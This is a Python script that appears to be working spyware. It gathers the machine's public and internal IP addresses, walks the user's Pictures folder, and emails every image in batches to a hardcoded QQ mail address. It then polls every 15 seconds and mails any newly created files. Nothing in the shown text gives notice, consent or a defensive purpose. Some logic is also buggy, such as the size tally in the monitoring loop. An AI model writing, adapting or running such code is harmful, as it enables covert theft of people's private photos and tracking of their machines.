#default is windows os

#given the default dir is Pictures

import os
import time
import socket
import sys
import logging
import threading
from urllib2 import urlopen

import email_client

logging.basicConfig(filename="log.log",format='%(asctime)s %(levelname)s %(message)s',level=logging.INFO)

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostbyname(socket.gethostname())
current_time = time.strftime("%Y-%m-%d %H:%M:%S")

ATTACHMENT_SIZE = 20

target_email = "848334436@qq.com"
subject = "From %s computer" %current_public_ip
content = current_time +"\r %s" %current_inner_ip

current_time = time.strftime("%Y-%m-%d %H:%M:%S")

sys_init_time = 0
last_send_time = 0
execute_time = 15 #one day to execute



def _init(pic_path):
    logging.info("System initing....\r")

    files_list = []
    current_files_size = 0
    attachment_size = 0

    for path in pic_path:
        logging.info("Working dir is %s" %path)
        for root, dirs, files in os.walk(path):
            for name in files:
                full_name = root + '/' + name
                logging.info("File %s add to list\r" %full_name)
                files_list.append(full_name)

                attachment_size += 1
                #transfer to MB
                current_files_size += os.path.getsize(full_name)
                current_files_size =current_files_size / (1024*1024.0)

                #if the current files size bigger than 20MB It will send and files_list will init to []
                if current_files_size >=20 or attachment_size ==ATTACHMENT_SIZE:
                    logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)

                    email_client.mail(target_email,
                       subject,
                       content,
                       files_list)

                    files_list = []
                    current_files_size = 0

    email_client.mail(target_email,
           subject,
           content,
           files_list)

    sys_init_time = time.time()
    global last_send_time
    last_send_time = sys_init_time
    logging.info("System initing send time %s" %last_send_time)
    logging.info("System inited at %s.\r" %time.strftime("%Y-%m-%d %H:%M:%S"))

def _single_file_monitor(f):
    global last_send_time
    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
    if (f_create_time - last_send_time) > 0:
        logging.info("File %s created at %s\r"%(f,f_create_time))
        logging.info("Last Send Time %s" %last_send_time)
        return True
    else:
        return False

def _running(pic_path):
    flag = True
    files_to_send = []
    send_times = 1
    global last_send_time
    current_files_size = 0
    attachment_size = 0

    while flag:
        updated_files = []
        files_list = []

        for path in pic_path:
            for root, dirs, files in os.walk(path):
                for name in files:
                    full_name = root + '/' + name
                    files_list.append(full_name)
            '''
            check the files in list are the newest!
            '''
            for f_name in files_list:
                if _single_file_monitor(f_name):
                    updated_files.append(f_name)
                    attachment_size += 1
                    current_files_size += os.path.getsize(full_name)
                    current_files_size =current_files_size / (1024*1024.0)
                else:
                    logging.info("File %s will not be sent twice\r" %f_name)

            if updated_files == []:
                logging.info("Entering wait condition")
            else:
                #transfer to MB
                #if the current files size bigger than 20MB It will send and files_list will init to []

                if current_files_size >=20 or attachment_size ==ATTACHMENT_SIZE:
                    logging.warning("FILE SIZE LIMIT %s AND WILL SEND"%attachment_size)

                    email_client.mail(target_email,
                       subject,
                       content,
                       updated_files)

                    updated_files = []
                    current_files_size = 0
                    send_times += 1
                    last_send_time = time.time()
                    logging.info("File sent at %s \r" %time.ctime())

                else:
                    email_client.mail(target_email,
                                        subject,
                                        content,
                                        updated_files)
                    send_times += 1
                    last_send_time = time.time()
                    logging.info("File sent at %s \r" %time.ctime())

        logging.info("System sleep %s seconds" %execute_time)

        logging.info("System has sent %s mails" %send_times)
        time.sleep(execute_time)




if __name__ == '__main__':
    try:
        pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")

        handle_path = []
        handle_path.append(pic_path)
        #handle_path.append("C:/Users/jason03.zhang/Pictures/Pictures/Pictures/Sample Pictures")
        _init(handle_path)

        threading.Thread(target=_running(handle_path)).start()
    except KeyboardInterrupt:
        sys.exit()
